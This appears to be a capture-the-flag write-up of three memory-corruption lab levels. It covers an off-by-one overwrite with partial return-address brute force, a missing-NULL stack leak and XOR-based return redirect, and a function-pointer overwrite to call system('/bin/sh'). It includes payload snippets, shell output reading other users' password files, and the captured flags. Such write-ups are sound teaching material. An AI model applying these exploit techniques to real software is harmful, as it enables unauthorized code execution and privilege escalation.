## lab6C

In this lab we are handling tweets once again. We have 4 interesting functions:
	* ```handle_tweet``` - makes calls to the other 2 functions
	* ```set_username``` - as the name implies, asks as to insert a username
	* ```set_tweet``` - as the name implies, asks as to insert a tweet
	* ```secret_backdoor``` - allows us to execute systems() commands, but we can't access it.

The ```handle_tweet``` function is called once, therefore we will only insert one username and one tweet.
The username and tweet are stored in a ```struct```.

```c
struct savestate {
    char tweet[140];
    char username[40];
    int msglen;
} save;
```

When setting the username, we can see that first it will put our input in an array with a call to fgets. It will then go through a for loop and copy byte after byte into our ```save->username```. This is where the flaw comes in:

```c
for(i = 0; i <= 40 && readbuf[i]; i++)
        save->username[i] = readbuf[i];
```

As we can see, it writes one more byte and so will overwrite ```int msglen```, which was set to 140 before. As such, we can set ```msglen``` to any value we want and so we can overflow the ```tweet[140]``` buffer and change the ```ret``` pointer of ```handle_tweet``` to ```secret_backdoor```.

This is our first challenge with ```ASLR``` and ```PIE``` enabled, so you bet that the address are not static at all.

Here are the addresses of the original ```ret``` pointer and the address of ```secret_backdoor```.

```
0xb7757 98a - ret
0xb7757 72b - secret_backdoor
```

Here they are again after being modified in by PIE.

```
0xb7731 98a - ret
0xb7731 72b - secret_backdoor
```

As you can see, the higher ```5 bits``` are the same in both addresses. Therefore, we would only need to modify the last ```3 bits```. Since, at minimum, we can modify one byte at a time, we will have to modify the last ```2 bytes```/```4 bits``` and pray to God that the 4th last bit matches.

In conclusion, we have to perform a ```brute force```. It should work 1 out of 16 times.
Note that we will have to set ```msglen``` accordingly, so that we overwrite only the ```local variables```, ```base pointer``` and 2 bytes off of ```ret```. From the ```struct``` to ```base pointer``` there are ```192 byte``` => ```192 + 4 + 2 = 198 bytes``` => ```msglen``` will be set to ```\xC6.```

```bash
lab6C@warzone:/levels/lab06$ python expl6C.py
--------------------------------------------
|   ~Welcome to l33t-tw33ts ~    v.0.13.37 |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: Tweet @Unix-Dude
>>: >: Tweet sent!
/bin/sh
cat ~lab6B/.pass
p4rti4l_0verwr1tes_r_3nuff
```

## lab6B

This is our first remote challenge!

In ```main``` we can see that the binary makes calls in order to read and store the flag on the ```heap```. It will then make a call to ```hash_pass``` in order to modify the ```password```.
It will then make a call to ```login_prompt```, the focus of this challenge.

This is ```hash_pass```:

```c
void hash_pass(char * password, char * username)
{
    int i = 0;

    /* hash pass with chars of username */
    while(password[i] && username[i])
    {  
        password[i] ^= username[i];
        i++;
    }  

    /* hash rest of password with a pad char */
    while(password[i])
    {  
        password[i] ^= 0x44;
        i++;
    }  

    return;
}
```

It's pretty clear what it does. It ```xor```'s every character from ```password``` with its ```username``` index counterpart, so long none of them are zero. After that, if ```password``` still has characters left unhashed, it will ```xor``` with ```0x44``` ('D').

Now let's look at ```login_prompt```. At first glance, it seems that the function seems secure enough.

* ```attempts``` variable is initialized with ```-3```
* ```result``` variable is initialized with ```-1```
* It goes through a ```while``` loop with the condition ```attempts++ != 0```
* in every iteration of the loop it sets the buffers ```password```, ```username``` and ```readbuff``` to 0s.
* It will read from stdin with ```fgets``` and stores it in ```readbuff```
* It will perform ```strncpy``` to store the input into ```password``` and ```username``` respectively, using ```sizeof``` to * determine the number of bytes copied
* calls ```hash_pass``` with our ```password``` and our ```username``` as arguments
* compares our password and flag.
* If ```equal```, it will make a call to ```login()``` - the win function which spawns a shell.
* If ```not equal```, will ```display our username string``` and go through the loop
* when the loop finishes, it returns ```result```

Now where is the problem here? Well, as things work in ```C language```, whenever we have an ```array of characters```, we have to make sure that we also reserve one byte for our ```NULL``` character, to determine the end of our string.

```c
    char password[32];
    char username[32];
    char readbuff[128];
    int attempts = -3;
    int result = -1;
```

When ```strncpy``` is performed, ```sizeof``` will return ```32 bytes``` and, subsequently, we will copy 32 bytes from ```readbuff``` into ```username``` or ```password``` buffer, completely omitting to insert a ```NULL``` character at the end! If we look into memory, this is the placement of our buffers:

```asm
[84:88] ebp + 4    - RET
[80:84] ebp        - base pointer
[76:80] ebp - 0x04 - trash
[72:76] ebp - 0x08 - trash
[68:72] ebp - 0x0c - attempts
[64:68] ebp - 0x10 - result
[32:64] ebp - 0x30 - password
[0:32]  ebp - 0x50 - username
```

Now, here gets the fun part. Since there are no ```NULL characters```, when 
```c
printf("Authentication failed for user %s\n", username);
``` 
will be called it will print the whole ```stack```, including the ```ret``` pointer, which provides us an ```information leak``` and means to determine the correct address of ```login()```!

Thing is, since we don't have ```NULL characters``` for our ```username``` and ```password``` strings, our ```hash_pass``` function will go bonkers. Normally, it will stop since eventually both buffers will reach their end. But with that missing, it will continue on hashing!

So this is how it will work now. The ```password buffer```, the first 32 bytes will be hashed normally and its bytes values will basically be ```password[i] ^ username[i]```. But we will not stop hashing there. Continuing, we will hash everything afterwards with the values in the password buffer - not the old ones but the ones freshly hashed!

So basically, after finishing hashing, the value in place of our ```ret``` pointer will be ```ret[i] ^ (password[i] ^ username[i])```. As such, in our first phase (the information leak), to find the value of ```ret``` we will have to to perform 2 xor's to get to the original value.

I send ```32 "A"s``` as my ```username``` and ```32 "\x03"``` as my ```password```. ```0x41 ^ 0x03 = 0x42 = "B"```. So I will have to ```xor``` the modified ```ret``` with ```0x42424242``` to get to the orginal value.

Once we find out the value of ```ret```, we have to find out te address of ```login()```. The only difference between them is the last 3 ```nibbles``` -> ```0xaf4```. We make a simple bitwise operation and voila!

```python
login = (ret & 0xfffff000) + 0xaf4
```

Now for ```phase 2``` and the hard part. Since we can hash ```ret```, we basically can change it to any value we want. We also have to change the value of ```attempts``` since we obstructed it last time and we need to exit the loop in order to exit the function. Since we cannot set it to zero because of the NULL bytes, we will set it to ```-1```.

* set ```ret``` to point to ```login()```
* set ```attempts``` to ```-1```

We have to keep in mind that our ```ret``` and ```attempts``` variables have been obstructed due to our previous ```hash```. We call these 2 values ```bad_ret``` and ```bad_attempts```.

Basically,
```bad_ret ^ (username ^ passwordRet) = login```

We know the values of ```bad_ret```, ```login```. Let's say that ```username``` is once again ```32 "A"s```. We need to find the value of ```password``` then.

```
0x41414141 ^ passwordRet = bad_ret ^ login 
passwordRet = bad_ret ^ login ^ 0x41414141
```

This applies to ```attempts``` as well.

```
passwordAttempts = bad_attempts ^ 0xFEFFFFFF ^ 0x41414141
```

Once we got these values down, we simply have construct them in our ```password```.

```python
# username
r.sendline ("A" * 32)

# result, attempts, trash, trash, base pointer, ret, padding
r.sendline ("BBBB" + passwordAttempts + "BBBB" + "BBBB" + "CCCC" + passwordRet + "DDDDDDDD")
```

Oh and don't forget to add ```padding``` at the end so that there are no ```NULL characters```. And that's it!

```bash
lab6B@warzone:/tmp/transcen/lab06$ python expl6B.py
[+] Opening connection to 172.16.37.128 on port 6642: Done
[*] ret: 0xb77d1f7e
[*] login: 0xb77d1af4
[*] Switching to interactive mode
Enter your username: Enter your password: Authentication failed for user AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x03\x03\x03\x03BBBB\x03\x03\x03\x03\x03\x03\x03\x03�GBB\x05\x05\x05\x05\x05\x05\x05\x05\xbe\xbe\xbe\xbe\xff\xff\xff\xff9~<�9~<��,�\xff�}�\
Enter your username: Enter your password: Authentication failed for user

WELCOME MR. FALK
$ cat /home/lab6A/.pass
strncpy_1s_n0t_s0_s4f3_l0l
```

## lab6A

Here we have a structure uinfo.

```c
struct uinfo {
    char name[32];
    char desc[128];
    unsigned int sfunc;
}user;
```

We have 4 options in this binary:
* ```Setup Account``` - asks us to set the ```user``` and ```desc```
* ```Make Listing``` - asks us to set some values for a global struct
* ```View Info``` - does a weird function call with ```uinfo```'s ```sfunc``` variable:
```c ( (void (*) (struct uinfo *) ) merchant.sfunc) (&merchant);```
* ```Exit```

There are also some other functions that are not used here. One that concerns us is ```print_name```:

```c
void print_name(struct uinfo * info) {
    printf("Username: %s\n", info->name);
}
```

Things are starting to connect. We have to somehow call this function in order to leak an address, which will help us beat ```ASLR```. Since option nr. 3 allows us to call a function set by the value in the member ```sfunc```, we need to somehow change it and set it to call ```print_name```.

Looking at the ```setup_account``` function, we can see a very obvious buffer overflow:

```c
void setup_account(struct uinfo * user) {
    char temp[128];
    memset(temp, 0, 128);
    printf("Enter your name: ");
    read(0, user->name, sizeof(user->name));
    printf("Enter your description: ");
    read(0, temp, sizeof(user->desc));
    strncpy(user->desc, user->name,32);
    strcat(user->desc, " is a ");

    memcpy(user->desc + strlen(user->desc), temp, strlen(temp));
}
```

If we fill ```user->name``` with ```32 bytes``` (so that there is no ```NULL``` character), we can overflow ```32 + len(" is a ") = 38 bytes``` past the ```user->desc``` buffer, directly into the ```sfunc``` member.

The last ```3 bits``` of ```print_name``` are ```0xbe2```. Like last time, since we cannot write a ```nibble``` at a time, we have to brute force our way.

Once we manage, we can find out from our leak the address of ```print_name```. Using that, and knowing that ```system()``` is always at ```-0x19da52 bytes```, we can find out its address.

Because of the fact that when we call ```sfunc```, its argument is the address of the structure, we can write ```"/bin/sh\x00"``` as our ```user->name``` and it will act as our argument. We only need to change ```sfunc``` to ```system()```.

```bash
lab6A@warzone:/tmp/transcen/lab06$ python expl6A.py
[+] Starting program '/levels/lab06/lab6A': Done
[!] Retrying...
[+] Starting program '/levels/lab06/lab6A': Done
[!] Retrying...
[+] Starting program '/levels/lab06/lab6A': Done
[!] Retrying...
[+] Starting program '/levels/lab06/lab6A': Done
[!] Retrying...
[+] Starting program '/levels/lab06/lab6A': Done
[*] address of system: 0xb75f3190
[*] Switching to interactive mode
Enter your name: Enter your description: Enter Choice: $ whoami
lab6end
$ cat /home/lab6end/.pass
eye_gu3ss_0n_@ll_mah_h0m3w3rk
```
